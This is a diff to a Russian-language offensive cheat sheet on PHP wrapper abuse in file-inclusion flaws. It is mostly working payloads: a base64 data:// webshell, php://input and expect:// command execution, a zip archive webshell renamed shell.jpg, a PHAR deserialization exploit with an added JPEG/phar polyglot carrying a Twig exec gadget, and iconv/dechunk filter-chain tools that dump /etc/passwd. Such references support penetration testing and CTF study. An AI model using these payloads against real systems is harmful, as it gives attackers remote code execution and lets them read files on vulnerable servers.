@@ -1,28 +1,36 @@
-* [Wrapper php://filter]()
-* [Wrapper data://]()
-* [Wrapper expect://]()
-* [Wrapper input://]()
-* [Wrapper zip://]()
+* [Wrapper php://filter](#Wrapper-php-filter)
+* [Wrapper data://](Wrapper-data)
+* [Wrapper expect://](#Wrapper-expect)
+* [Wrapper input://](#Wrapper-input)
+* [Wrapper zip://](#Wrapper-zip)
 * [Wrapper phar://](#Wrapper-phar)
-   * [Структура PHAR архива]()
-   * [Десериализация PHAR]()
-* [Wrapper convert.iconv:// и dechunk://]()
-   * [Утечка содержимого файла через оракул на основе ошибок]()
-   * [Утечка содержимого файла внутри пользовательского формата вывода]()
-   * Ссылки
+   * [Структура PHAR архива](#Структура-PHAR-архива)
+   * [Десериализация PHAR](#Десериализация-PHAR)
+* [Wrapper convert.iconv:// и dechunk://](#Wrapper-converticonv-и-dechunk)
+   * [Утечка содержимого файла через оракул на основе ошибок](#Утечка-содержимого-файла-через-оракул-на-основе-ошибок)
+   * [Утечка содержимого файла внутри пользовательского формата вывода](#Утечка-содержимого-файла-внутри-пользовательского-формата-вывода)
+   * [Утечка содержимого файла с использованием примитива слепого чтения файлов](#Утечка-содержимого-файла-с-использованием-примитива-слепого-чтения-файлов)
+* [URL](#URL)
 
 > Wrapper в контексте уязвимостей включения файлов относится к протоколу или методу, используемому для доступа или включения файла.
 >> Wrappers часто используются в PHP или других серверных языках для расширения функциональности включения файлов, позволяя использовать протоколы, такие как HTTP, FTP и другие, в дополнение к локальной файловой системе.
 
+* **Простая аналогия**
+    * Локальный файл (/var/www/index.php) = Взять книгу с полки в своей комнате.
+    * HTTP wrapper (http://example.com/data.txt) = Съездить на велосипеде в другую библиотеку по специальному адресу (URL) и привезти книгу оттуда.
+    * FTP wrapper (ftp://example.com/file.zip) = Воспользоваться грузовиком, чтобы забрать тяжелую папку с документами со специального файлового сервера.
+    * php://filter = Взять книгу с полки, но надеть на себя специальные очки (фильтр), которые, например, переводят весь текст в нейтральный стиль (rot13) или шифруют его в формат, понятный только машинам (base64), прежде чем начать читать.
+
 # Wrapper php://filter
 
-Часть "php://filter" нечувствительна к регистру.
+* Часть ```"php://filter"``` **нечувствительна к регистру**.
+* php://filter и data:// часто работают вместе
 
 |Фильтр|Описание|
-|--------|----------|
-|php://filter/read=string.rot13/resource=index.php	|Отображает index.php в кодировке rot13|
-|php://filter/convert.iconv.utf-8.utf-16/resource=index.php |	Кодирует index.php из utf8 в utf16|
-|php://filter/convert.base64-encode/resource=index.php|Отображает index.php в виде строки в кодировке base64|
+|:--------:|:----------:|
+|```php://filter/read=string.rot13/resource=index.php```|Отображает index.php в кодировке rot13|
+|```php://filter/convert.iconv.utf-8.utf-16/resource=index.php``` |	Кодирует index.php из utf8 в utf16|
+|```php://filter/convert.base64-encode/resource=index.php```|Отображает index.php в виде строки в кодировке base64|
 
 ```python
 http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
@@ -67,7 +75,7 @@ curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO20
 
 # Wrapper data://
 
-Полезная нагрузка в кодировке base64: "<?php system($_GET['cmd']);echo 'Shell done !'; ?>".
+Полезная нагрузка в кодировке base64: ```"<?php system($_GET['cmd']);echo 'Shell done !'; ?>"```.
 
 ```python
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
@@ -77,7 +85,7 @@ http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbW
 
 # Wrapper expect://
 
-При использовании в PHP или подобном приложении, может позволить злоумышленнику выполнять команды в системной оболочке, так как wrapper expect:// может вызывать команды оболочки как часть своего ввода.
+При использовании в PHP или подобном приложении, может позволить выполнять команды в системной оболочке, так как wrapper expect:// может вызывать команды оболочки как часть своего ввода.
 
 ```python
 http://example.com/index.php?page=expect://id
@@ -86,7 +94,7 @@ http://example.com/index.php?page=expect://ls
 
 # Wrapper input://
 
-Укажите вашу полезную нагрузку в параметрах POST, это можно сделать с помощью простой команды curl.
+Укажи полезную нагрузку в параметрах POST, это можно сделать с помощью curl.
 
 ```bash
 curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index.php?page=php://input%00" -k -v
@@ -100,9 +108,9 @@ curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://example.com/index
 
 # Wrapper zip://
 
-* Создайте вредоносную полезную нагрузку: echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
+* Создай вредоносную полезную нагрузку: echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
 
-* Заархивируйте файл:
+* Заархивируй файл:
 
 ```bash
 zip payload.zip payload.php;
@@ -110,7 +118,7 @@ mv payload.zip shell.jpg;
 rm payload.php
 ```
 
-* Загрузите архив и получите доступ к файлу с помощью wrapper'ов:
+* Загрузи архив и получите доступ к файлу с помощью wrapper'ов:
 
 ```bash
 http://example.com/index.php?page=zip://shell.jpg%23payload.php
@@ -120,9 +128,9 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 ## Структура PHAR архива
 
-Файлы PHAR работают как ZIP-файлы, и вы можете использовать phar:// для доступа к файлам, хранящимся внутри них.
+Файлы PHAR работают как ZIP-файлы, и можно использовать phar:// для доступа к файлам, хранящимся внутри них.
 
-* Создайте phar-архив, содержащий файл-бэкдор: php --define phar.readonly=0 archive.php
+* Создай phar-архив, содержащий файл-бэкдор: php --define phar.readonly=0 archive.php
 
 ```php
 <?php
@@ -137,11 +145,12 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 
 ## Десериализация PHAR
 
-⚠️ Эта техника не работает на PHP 8+, десериализация была удалена.
+⚠️ **Эта техника не работает на PHP 8+, десериализация была удалена.**
 
-Если операция с файлом выполняется на нашем существующем phar-файле через wrapper phar://, то его сериализованные метаданные десериализуются. Эта уязвимость возникает в следующих функциях, включая file_exists: include, file_get_contents, file_put_contents, copy, file_exists, is_executable, is_file, is_dir, is_link, is_writable, fileperms, fileinode, filesize, fileowner, filegroup, fileatime, filemtime, filectime, filetype, getimagesize, exif_read_data, stat, lstat, touch, md5_file, и т.д.
+> Если операция с файлом выполняется на нашем существующем phar-файле через wrapper phar://, то его сериализованные метаданные десериализуются. 
+>> Эта уязвимость возникает в следующих функциях, включая ```file_exists: include```, ```file_get_contents```, ```file_put_contents```, ```copy```, ```file_exists```, ```is_executable```, ```is_file```, ```is_dir```, ```is_link```, ```is_writable```, ```fileperms```, ```fileinode```, ```filesize```, ```fileowner```, ```filegroup```, ```fileatime```, ```filemtime```, ```filectime```, ```filetype```, ```getimagesize```, ```exif_read_data```, ```stat```, ```lstat```, ```touch```, ```md5_file```, и т.д.
 
-Для этого эксплойта требуется хотя бы один класс с магическими методами, такими как __destruct() или __wakeup(). Возьмем в качестве примера этот класс AnyClass, который выполняет параметр data.
+* Для этого эксплойта требуется хотя бы один класс с магическими методами, такими как __destruct() или __wakeup(). Возьмем в качестве примера этот класс AnyClass, который выполняет параметр data.
 
 ```php
 class AnyClass {
@@ -192,6 +201,41 @@ $phar->stopBuffering();
 $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
 ```
 
+* **Poyglot jpg->phar**
+
+```php
+<?php
+class CustomTemplate {}
+class Blog {}
+
+if (ini_get('phar.readonly')) {
+    die("Run: php -d phar.readonly=0 " . basename(__FILE__) . "\n");
+}
+
+$object = new CustomTemplate;
+$blog = new Blog;
+$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}';
+$blog->user = 'user';
+$object->template_file_path = $blog;
+
+// Создаем реальный минимальный JPEG (1x1 pixel)
+$jpg = base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAv/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8U/9k=');
+
+@unlink('evil.phar');
+
+$phar = new Phar('evil.phar');
+$phar->startBuffering();
+$phar->setStub($jpg . '<?php __HALT_COMPILER(); ?>');
+$phar->addFromString('test.txt', 'test');
+$phar->setMetadata($object);
+$phar->stopBuffering();
+
+copy('evil.phar', 'evil.jpg');
+@unlink('evil.phar');
+
+?>
+```
+
 # Wrapper convert.iconv:// и dechunk://
 
 ### Утечка содержимого файла через оракул на основе ошибок
@@ -209,13 +253,13 @@ $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
 
 Цепочка эксплойта основана на PHP фильтрах: iconv и dechunk:
 
-1. Используйте фильтр ```iconv``` с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.
-2. Используйте фильтр ```dechunk```, чтобы определить первый символ файла, на основе предыдущей ошибки.
-3. Снова используйте фильтр ```iconv``` с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.
+1. Используй фильтр ```iconv``` с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.
+2. Используй фильтр ```dechunk```, чтобы определить первый символ файла, на основе предыдущей ошибки.
+3. Снова используй фильтр ```iconv``` с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.
 
 Эксплойт с использованием [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), скрипт будет использовать либо код состояния HTTP: 500, либо время в качестве оракула на основе ошибок для определения символа.
 
-```bash
+```python
 $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
 [*] The following URL is targeted : http://127.0.0.1
 [*] The following local file is leaked : /test
@@ -227,7 +271,7 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 
 [ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Генерирует цепочку php://filter, которая добавляет префикс и суффикс к содержимому файла.
 
-Чтобы получить содержимое некоторого файла, мы хотели бы иметь: {"message":"<содержимое файла>"}.
+Чтобы получить содержимое некоторого файла, необходимо иметь: {"message":"<содержимое файла>"}.
 
 ```bash
 ./wrapwrap.py /etc/passwd 'PREFIX' 'SUFFIX' 1000
@@ -249,9 +293,17 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 
 * [ambionics/lightyear](https://github.com/ambionics/lightyear)
 
-```bash
+```python
 code remote.py # отредактируйте Remote.oracle
 ./lightyear.py test # проверьте, что ваша реализация работает
 ./lightyear.py /etc/passwd # сдампите файл!
 ```
 
+# URL
+
+* [решение таска "Includer's Revenge" из hxp CTF 2021 без контроля над файлами. ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)
+* [php-filters-chain-what-is-it-and-how-to-use-it](https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it.html)
+* [php-filter-chains-file-read-from-error-based-oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)
+* [wrapwrap-php-filters-suffix](https://www.ambionics.io/blog/wrapwrap-php-filters-suffix)
+* [lightyear-file-dump](https://www.ambionics.io/blog/lightyear-file-dump)
+* [iconv-cve-2024-2961-p1](https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html)
